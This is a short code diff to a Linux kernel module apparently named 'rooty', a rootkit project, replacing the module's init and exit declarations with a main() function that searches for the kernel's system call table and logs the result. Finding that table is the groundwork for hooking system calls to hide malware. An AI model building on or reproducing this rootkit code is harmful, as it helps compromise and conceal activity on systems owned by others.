@@ -9,10 +9,13 @@
 
 MODULE_LICENSE("GPL");
 
-int rooty_init(void);
-void rooty_exit(void);
-module_init(rooty_init);
-module_exit(rooty_exit);
+int main() {
+ if ((sys_call_table = (psize *) find())) {
+   printk("rooty: sys_call_table found at %p\n", sys_call_table);
+  } else {
+   printk("rooty: sys_call_table not found, aborting\n");
+  }
+}
 
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
